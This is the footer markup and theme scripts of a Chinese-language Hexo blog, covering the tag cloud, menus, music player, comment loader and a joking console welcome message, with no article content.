href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 0.88rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="is-center" id="loading-database"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-pulse-icon"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/medium-zoom@1.1.0/dist/medium-zoom.min.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2020 By 安知鱼 V1.6.12",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 hybcx 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>(() => {
  const initValine = () => {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
      appKey: 'iEFJUGMm2FY91n9ZG1gdKBSy',
      avatar: 'mp',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  const loadValine = async () => {
    if (typeof Valine === 'function') initValine()
    else {
      await getScript('https://cdn.cbd.int/valine@1.5.1/dist/Valine.min.js')
      initValine()
    }
  }

  if ('Valine' === 'Valine' || !false) {
    if (false) anzhiyu.loadComment(document.getElementById('vcomment'),loadValine)
    else setTimeout(loadValine, 0)
  } else {
    window.loadOtherComment = loadValine
  }
})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script src="https://cdn.cbd.int/blueimp-md5@2.19.0/js/md5.min.js"></script><script>window.addEventListener('load', () => {
  const changeContent = (content) => {
    if (content === '') return content

    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
    content = content.replace(/<[^>]+>/g,"") // remove html tag

    if (content.length > 150) {
      content = content.substring(0,150) + '...'
    }
    return content
  }

  const getIcon = (icon, mail) => {
    if (icon) return icon
    let defaultIcon = '?d=mp'
    let iconUrl = `https://gravatar.loli.net/avatar/${md5(mail.toLowerCase()) + defaultIcon}`
    return iconUrl
  }

  const generateHtml = array => {
    let result = ''

    if (array.length) {
      for (let i = 0; i < array.length; i++) {
        result += '<div class=\'aside-list-item\'>'

        if (true) {
          const name = 'data-lazy-src'
          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
        }

        result += `<div class='content'>
        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
        <div class='name'><span>${array[i].nick} / </span><time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
        </div></div>`
      }
    } else {
      result += '没有评论'
    }

    let $dom = document.querySelector('#card-newest-comments .aside-list')
    $dom && ($dom.innerHTML= result)
    window.lazyLoadInstance && window.lazyLoadInstance.update()
    window.pjax && window.pjax.refresh($dom)
  }

  const getComment = () => {
    const serverURL = 'https://7Sc5uZwc.api.lncldglobal.com'

    var settings = {
      "method": "GET",
      "headers": {
        "X-LC-Id": '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
        "X-LC-Key": 'iEFJUGMm2FY91n9ZG1gdKBSy',
        "Content-Type": "application/json"
      },
    }

    fetch(`${serverURL}/1.1/classes/Comment?limit=6&order=-createdAt`,settings)
      .then(response => response.json())
      .then(data => {
        const valineArray = data.results.map(function (e) {
          return {
            'avatar': getIcon(e.QQAvatar, e.mail),
            'content': changeContent(e.comment),
            'nick': e.nick,
            'url': e.url + '#' + e.objectId,
            'date': e.updatedAt,
          }
        })
        saveToLocal.set('valine-newest-comments', JSON.stringify(valineArray), 10/(60*24))
        generateHtml(valineArray)
      }).catch(e => {
        const $dom = document.querySelector('#card-newest-comments .aside-list')
        $dom.textContent= "无法获取评论，请确认相关配置是否正确"
      }) 
  }

  const newestCommentInit = () => {
    if (document.querySelector('#card-newest-comments .aside-list')) {
      const data = saveToLocal.get('valine-newest-comments')
      if (data) {
        generateHtml(JSON.parse(data))
      } else {
        getComment()
      }
    }
  }

  newestCommentInit()
  document.addEventListener('pjax:complete', newestCommentInit)
})</script><script async data-pjax src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.1/bubble/bubble.js"></script><script>var visitorMail = "";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><script src="/js/anzhiyu/right_click_menu.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>